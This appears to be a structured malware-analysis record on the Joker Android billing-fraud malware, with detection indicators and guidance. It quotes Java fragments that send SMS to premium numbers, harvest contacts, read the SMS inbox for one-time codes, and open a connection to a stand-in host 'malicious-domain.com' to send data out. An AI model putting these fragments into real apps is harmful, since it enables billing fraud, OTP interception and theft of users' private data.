package_info.package_versions: Unknown (latest variants as of report date)
package_info.why_malicious: The Joker malware is a premium billing fraud malware that infiltrates Android devices via malicious apps on Google Play. It secretly subscribes users to premium services, exfiltrates SMS and contact data, and employs new evasion techniques to bypass detection.

execution_context.file_location: malicious app code (e.g., MainActivity.java or background service)

malicious_snippets.code_snippet: SmsManager smsManager = SmsManager.getDefault(); smsManager.sendTextMessage(premiumNumber, null, message, null, null);
malicious_snippets.code_behavior: At runtime, the code sends SMS messages to premium-rate numbers using the device's SMSManager API, resulting in unauthorized premium service subscriptions and financial loss for the victim.

malice_analysis.why_suspicious: Sending SMS to premium-rate numbers without user consent is a classic sign of billing fraud.
malice_analysis.violated_expectations: Normal apps do not send SMS to premium numbers without explicit user action and clear disclosure.
malice_analysis.similar_legitimate_use: Some legitimate apps may send SMS for user-initiated actions (e.g., two-factor authentication), but always with user consent.
key_indicators: Automated SMS sending to premium-rate numbers
Lack of user interaction or notification

execution_context.file_location: malicious app code (background service or receiver)

malicious_snippets.code_snippet: Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null); while (cursor.moveToNext()) { String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)); // ... collect and exfiltrate }
malicious_snippets.code_behavior: At runtime, the code reads the user's contact list and exfiltrates the data to a remote server, resulting in privacy violation and potential further targeting.

malice_analysis.why_suspicious: Harvesting and exfiltrating contact data is a common tactic for both fraud and further social engineering.
malice_analysis.violated_expectations: Legitimate apps should only access contacts for clear, user-facing features and never exfiltrate them without consent.
malice_analysis.similar_legitimate_use: Messaging or social apps may access contacts to find friends, but with user permission and no exfiltration.
key_indicators: Access to contacts without clear user-facing feature

execution_context.file_location: malicious app code (background service or receiver)

malicious_snippets.code_snippet: ContentResolver cr = getContentResolver(); Cursor cursor = cr.query(Uri.parse("content://sms/inbox"), null, null, null, null); while (cursor.moveToNext()) { String body = cursor.getString(cursor.getColumnIndex("body")); // ... exfiltrate }
malicious_snippets.code_behavior: At runtime, the code reads incoming SMS messages, intercepts OTPs or subscription confirmations, and exfiltrates them to a remote server, enabling fraudulent subscription confirmation and bypassing user awareness.

malice_analysis.why_suspicious: Intercepting and exfiltrating SMS, especially OTPs, is a hallmark of fraud and credential theft.
malice_analysis.violated_expectations: Normal apps should not access or exfiltrate SMS content unless explicitly required and disclosed.
malice_analysis.similar_legitimate_use: SMS backup apps may access SMS with user consent, but should not exfiltrate to unknown servers.

execution_context.file_location: malicious app code (obfuscated or dynamically loaded class)

malicious_snippets.code_snippet: String url = "http://malicious-domain.com/api"; HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection(); // ... send collected data
malicious_snippets.code_behavior: At runtime, the code establishes a network connection to a hardcoded malicious domain and exfiltrates collected data (contacts, SMS, device info), enabling attacker control and data theft.

malice_analysis.why_suspicious: Hardcoded C2 domains and exfiltration of sensitive data are strong indicators of malware.
malice_analysis.violated_expectations: Legitimate apps should not communicate with unknown or suspicious domains, especially to send sensitive data.
malice_analysis.similar_legitimate_use: Apps may use network connections for legitimate APIs, but not for exfiltrating private data.

attack_chain.action: User installs a seemingly benign app from Google Play containing Joker malware.
Malicious code executes in the background, harvesting contacts and SMS data.
attack_chain.leads_to: Data exfiltration and preparation for fraud

attack_chain.action: Malware sends SMS to premium-rate numbers to subscribe the victim to paid services.
Collected data (contacts, SMS, device info) is exfiltrated to attacker-controlled servers.
attack_chain.leads_to: Attacker gains access to sensitive data and can further monetize or target victims

behavioral_signatures: Automated sending of SMS to premium-rate numbers
Access and exfiltration of contacts and SMS data
Network connections to hardcoded or suspicious domains
Use of obfuscated or dynamically loaded code to evade detection
file_indicators: AndroidManifest.xml requesting SEND_SMS, READ_CONTACTS, READ_SMS, and INTERNET permissions
Presence of obfuscated classes or dynamically loaded code
Unusual background services with no user-facing functionality
network_indicators: Outbound connections to known Joker C2 domains
HTTP/HTTPS POST requests containing contact or SMS data
Frequent short-lived connections to external IPs/domains after app installation
detection_knowledge.how_to_detect: Monitor for apps requesting both SMS and contact permissions along with network access, especially if they send SMS to premium numbers or exfiltrate data to unknown domains. Use behavioral analysis to detect automated SMS sending and background data exfiltration. Flag apps with obfuscated code or dynamically loaded classes that access sensitive data without clear user-facing features.
